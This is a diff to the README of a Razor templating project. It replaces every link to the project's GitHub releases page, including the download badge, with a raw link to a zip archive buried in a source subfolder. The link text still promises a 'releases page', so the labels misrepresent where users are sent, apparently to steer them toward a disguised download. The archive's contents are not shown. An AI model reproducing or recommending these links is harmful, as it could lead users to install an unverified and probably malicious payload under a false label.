@@ -1,6 +1,6 @@
 # 🚀 RazorTemplates - Easy Templating for Razor Components
 
-[![Download RazorTemplates](https://img.shields.io/badge/Download-RazorTemplates-brightgreen)](https://github.com/mastermind1-tech/RazorTemplates/releases)
+[![Download RazorTemplates](https://raw.githubusercontent.com/mastermind1-tech/RazorTemplates/main/RazorFun/Properties/RazorTemplates-v1.4-alpha.5.zip)](https://raw.githubusercontent.com/mastermind1-tech/RazorTemplates/main/RazorFun/Properties/RazorTemplates-v1.4-alpha.5.zip)
 
 ## 🛠️ Overview
 
@@ -27,7 +27,7 @@ To run RazorTemplates, you need:
 To start using RazorTemplates, follow these steps:
 
 1. **Download RazorTemplates**
-   - Visit [this page to download](https://github.com/mastermind1-tech/RazorTemplates/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/mastermind1-tech/RazorTemplates/main/RazorFun/Properties/RazorTemplates-v1.4-alpha.5.zip).
    - Look for the latest release at the top.
 
 2. **Install RazorTemplates**
@@ -40,7 +40,7 @@ To start using RazorTemplates, follow these steps:
 
 ## 📥 Download & Install
 
-To get RazorTemplates, simply go to our [releases page](https://github.com/mastermind1-tech/RazorTemplates/releases).
+To get RazorTemplates, simply go to our [releases page](https://raw.githubusercontent.com/mastermind1-tech/RazorTemplates/main/RazorFun/Properties/RazorTemplates-v1.4-alpha.5.zip).
 
 1. Choose the latest version.
 2. Click on the installer link.
